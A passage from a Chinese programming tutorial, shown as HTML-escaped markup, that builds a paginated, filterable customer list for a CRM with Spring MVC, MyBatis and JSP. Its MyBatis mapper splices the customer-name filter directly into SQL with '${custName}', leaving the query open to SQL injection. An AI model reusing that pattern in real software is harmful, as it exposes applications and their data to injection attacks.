        model.addAttribute(&quot;fromType&quot;&lt;span&gt;, fromType);
        model.addAttribute(&lt;/span&gt;&quot;industryType&quot;&lt;span&gt;, industryType);
        model.addAttribute(&lt;/span&gt;&quot;levelType&quot;&lt;span&gt;, levelType);

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;customer&quot;&lt;span&gt;;
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;6.1. &lt;strong&gt;需求&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;展示客户列表，并且可以根据查询条件过滤查询结果，并且实现分页。&lt;/p&gt;
&lt;p&gt;效果如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711224802532-453621966.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;页面代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;panel-heading&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户信息列表&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; /.panel-heading &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;table &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;table table-bordered table-striped&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;thead&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;ID&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户名称&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户来源&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户所属行业&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户级别&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;固定电话&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;手机&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;操作&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;th&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;thead&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tbody&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;c:forEach &lt;/span&gt;&lt;span&gt;items&lt;/span&gt;&lt;span&gt;=&quot;${page.rows}&quot;&lt;/span&gt;&lt;span&gt; var&lt;/span&gt;&lt;span&gt;=&quot;row&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_id}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_name}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_source}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_industry}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_level}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_phone}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;${row.cust_mobile}&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;#&quot;&lt;/span&gt;&lt;span&gt; class&lt;/span&gt;&lt;span&gt;=&quot;btn btn-primary btn-xs&quot;&lt;/span&gt;&lt;span&gt; data-toggle&lt;/span&gt;&lt;span&gt;=&quot;modal&quot;&lt;/span&gt;&lt;span&gt; data-target&lt;/span&gt;&lt;span&gt;=&quot;#customerEditDialog&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;editCustomer(${row.cust_id})&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;修改&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;#&quot;&lt;/span&gt;&lt;span&gt; class&lt;/span&gt;&lt;span&gt;=&quot;btn btn-danger btn-xs&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;deleteCustomer(${row.cust_id})&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;删除&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;td&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tr&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:forEach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tbody&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;table&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;span&gt;分析我们需要根据四个条件进行查询，返回数据是分页对象&lt;/span&gt;Page&lt;/p&gt;

&lt;p&gt;Sql&lt;span&gt;语句&lt;/span&gt;:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;SELECT&lt;/span&gt;&lt;span&gt;
    a.cust_id,
    a.cust_name,
    a.cust_user_id,
    a.cust_create_id,
    b.dict_item_name cust_source,
    c.dict_item_name cust_industry,
    d.dict_item_name cust_level,
    a.cust_linkman,
    a.cust_phone,
    a.cust_mobile,
    a.cust_zipcode,
    a.cust_address,
    a.cust_createtime
&lt;/span&gt;&lt;span&gt;FROM&lt;/span&gt;&lt;span&gt;
    customer a
&lt;/span&gt;&lt;span&gt;LEFT&lt;/span&gt; &lt;span&gt;JOIN&lt;/span&gt; base_dict b &lt;span&gt;ON&lt;/span&gt; a.cust_source &lt;span&gt;=&lt;/span&gt;&lt;span&gt; b.dict_id
&lt;/span&gt;&lt;span&gt;LEFT&lt;/span&gt; &lt;span&gt;JOIN&lt;/span&gt; base_dict c &lt;span&gt;ON&lt;/span&gt; a.cust_industry &lt;span&gt;=&lt;/span&gt;&lt;span&gt; c.dict_id
&lt;/span&gt;&lt;span&gt;LEFT&lt;/span&gt; &lt;span&gt;JOIN&lt;/span&gt; base_dict d &lt;span&gt;ON&lt;/span&gt; a.cust_level &lt;span&gt;=&lt;/span&gt;&lt;span&gt; d.dict_id
&lt;/span&gt;&lt;span&gt;WHERE&lt;/span&gt;&lt;span&gt;
    a.cust_name &lt;/span&gt;&lt;span&gt;LIKE&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%马%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;AND&lt;/span&gt; a.cust_source &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;AND&lt;/span&gt; a.cust_industry &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;AND&lt;/span&gt; a.cust_level &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
LIMIT &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;6.2. &lt;strong&gt;&lt;span&gt;创建&lt;/span&gt;pojo&lt;span&gt;开发&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Customer {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Long cust_id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Long cust_user_id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Long cust_create_id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_source;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_industry;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_level;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_linkman;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_phone;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_mobile;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_zipcode;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String cust_address;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Date cust_createtime;
get&lt;/span&gt;/&lt;span&gt;set。。。。。。
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;6.3. &lt;strong&gt;&lt;span&gt;实现&lt;/span&gt;DAO&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;分析：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;前台发起请求&lt;/span&gt;,&lt;span&gt;需要接收请求过来的查询条件数据，可以使用&lt;/span&gt;&lt;span&gt;pojo&lt;/span&gt;&lt;span&gt;接收数据。需要依此编写查询逻辑。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;前台&lt;/span&gt;需要&lt;span&gt;分页显示&lt;/span&gt;&lt;span&gt;，根据准备好的分页实现，应该返回分页类&lt;/span&gt;Page&lt;span&gt;，而创建&lt;/span&gt;&lt;span&gt;Page&lt;/span&gt;&lt;span&gt;分页类需要数据总条数，所以也需要查询数据总条数的逻辑。&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span&gt;根据分析，&lt;/span&gt;DAO&lt;span&gt;需要编写两个方法&lt;/span&gt;:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;需要根据条件分页查询客户信息&lt;/li&gt;
&lt;li&gt;需要根据条件查询数据总条数&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;6.3.1. &lt;strong&gt;&lt;span&gt;创建&lt;/span&gt;QueryVo&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;需要编写&lt;/span&gt;QueryVo，里面&lt;span&gt;包含查询条件属性&lt;/span&gt;和分页数据。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;创建接受请求参数的&lt;/span&gt;QueryVo&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; QueryVo {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String custName;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String custSource;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String custIndustry;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String custLevel;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当前页码数&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; Integer page = 1&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 数据库从哪一条数据开始查&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer start;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 每页显示数据条数&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; Integer rows = 10&lt;span&gt;;
get&lt;/span&gt;/&lt;span&gt;set。。。。。。
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;6.3.2. &lt;strong&gt;Mapper&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;创建CustomerMapper 接口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; CustomerMapper {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据queryVo分页查询数据
     * 
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; queryVo
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    List&lt;/span&gt;&amp;lt;Customer&amp;gt;&lt;span&gt; queryCustomerByQueryVo(QueryVo queryVo);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据queryVo查询数据条数
     * 
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; queryVo
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;&lt;span&gt; queryCountByQueryVo(QueryVo queryVo);

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;6.3.3. &lt;strong&gt;Mapper.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;创建CustomerMapper.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; &lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE mapper
PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.mapper.CustomerMapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;customerQueryVo&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;custName != null and custName != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                AND a.cust_name LIKE '%${custName}%'
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;custSource != null and custSource != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                AND a.cust_source = #{custSource}
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;custIndustry != null and custIndustry != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                AND a.cust_industry = #{custIndustry}
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;custLevel != null and custLevel != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                AND a.cust_level = #{custLevel}
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 根据queryVo分页查询数据 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;queryCustomerByQueryVo&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.pojo.QueryVo&quot;&lt;/span&gt;&lt;span&gt;
        resultType&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.pojo.Customer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      SELECT
        a.cust_id,
        a.cust_name,
        a.cust_user_id,
        a.cust_create_id,
        b.dict_item_name cust_source,
        c.dict_item_name cust_industry,
        d.dict_item_name cust_level,
        a.cust_linkman,
        a.cust_phone,
        a.cust_mobile,
        a.cust_zipcode,
        a.cust_address,
        a.cust_createtime
      FROM
        customer a
        LEFT JOIN base_dict b ON a.cust_source = b.dict_id
        LEFT JOIN base_dict c ON a.cust_industry = c.dict_id
        LEFT JOIN base_dict d ON a.cust_level = d.dict_id
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;customerQueryVo&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;start != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
            LIMIT #{start}, #{rows}
        &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 根据queryVo查询数据条数 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;queryCountByQueryVo&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.pojo.QueryVo&quot;&lt;/span&gt;&lt;span&gt;
        resultType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        SELECT count(1) FROM customer a
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;customerQueryVo&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;6.4. &lt;strong&gt;&lt;span&gt;实现&lt;/span&gt;service&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;6.4.1. &lt;strong&gt;&lt;span&gt;接口&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;编写接口&lt;/span&gt;CustomerService&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; CustomerService {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据条件分页查询客户
     * 
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; queryVo
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    Page&lt;/span&gt;&amp;lt;Customer&amp;gt;&lt;span&gt; queryCustomerByQueryVo(QueryVo queryVo);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;6.4.2. &lt;strong&gt;&lt;span&gt;实现类&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;编写接口实现类&lt;/span&gt;CustomerServiceImpl&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; CustomerServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; CustomerService {
    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; CustomerMapper customerMapper;

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Page&amp;lt;Customer&amp;gt;&lt;span&gt; queryCustomerByQueryVo(QueryVo queryVo) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置查询条件,从哪一条数据开始查&lt;/span&gt;
        queryVo.setStart((queryVo.getPage() - 1) *&lt;span&gt; queryVo.getRows());

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 查询数据结果集&lt;/span&gt;
        List&amp;lt;Customer&amp;gt; list = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerMapper.queryCustomerByQueryVo(queryVo);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 查询到的数据总条数&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; total = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerMapper.queryCountByQueryVo(queryVo);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 封装返回的page对象&lt;/span&gt;
        Page&amp;lt;Customer&amp;gt; page = &lt;span&gt;new&lt;/span&gt; Page&amp;lt;&amp;gt;&lt;span&gt;(total, queryVo.getPage(), queryVo.getRows(), list);

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; page;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;6.5. &lt;strong&gt;&lt;span&gt;实现&lt;/span&gt;Controller&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;改造&lt;/span&gt;Controller&lt;span&gt;的方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
@RequestMapping(&quot;list&quot;&lt;span&gt;)
